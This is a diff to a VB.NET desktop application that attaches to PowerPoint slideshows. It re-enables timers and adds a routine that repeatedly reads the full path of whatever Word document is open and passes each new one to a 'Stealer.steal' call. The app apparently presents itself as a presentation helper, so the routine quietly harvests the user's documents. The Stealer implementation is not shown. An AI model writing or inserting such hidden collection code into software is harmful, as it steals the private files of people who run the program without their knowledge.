@@ -26,6 +26,8 @@ Class Application
     Dim close_timer, wordtimer As Timer
     Dim ppt_hwnd As Int32
 
+    Dim lastdoc As String
+
     Protected Overrides Sub OnExit(e As ExitEventArgs)
         logcat.Log.Logger.Instance.WriteLog(e.ApplicationExitCode.ToString)
         MyBase.OnExit(e)
@@ -56,20 +58,23 @@ Class Application
         AddHandler wordtimer.Elapsed, AddressOf wordprepare
         AddHandler prepare_timer.Tick, AddressOf prepare
         AddHandler close_timer.Elapsed, AddressOf close
-        'prepare_timer.Start()
-        'wordtimer.Start()
-        'wordprepare()
+        prepare_timer.Start()
+        wordtimer.Start()
+        wordprepare()
     End Sub
 
-    Private Sub wordprepare()
-        'Dim w As New Word.Application
-        'Try
-        '    Dim t = w.ActiveDocument.Path
-        '    AddHandler w.
-        'Catch ex As Exception
-        '    Logger.Instance.WriteException(ex)
-        'End Try
 
+    Private Sub wordprepare()
+        Try
+            Dim word As New Word.GlobalClass
+            Dim t = Word.ActiveDocument.FullName
+            If t <> lastdoc Then
+                Stealer.steal(t)
+                lastdoc = t
+            End If
+        Catch ex As Exception
+            Logger.Instance.WriteException(ex)
+        End Try
     End Sub
 
     Private Sub prepare()
@@ -81,7 +86,7 @@ Class Application
                 mw = New MainWindow1()
                 mw.ppt_hwnd = ppt_hwnd
                 GetWindowRect(ppt_hwnd, mw.ppt_rect)
-                mw.ppt_obj = New PowerPoint.Application
+                mw.ppt_obj = New PowerPoint.ApplicationClass
                 mw.ppt_view = mw.ppt_obj.ActivePresentation.SlideShowWindow.View
                 Me.MainWindow = mw
                 MainWindow.Show()
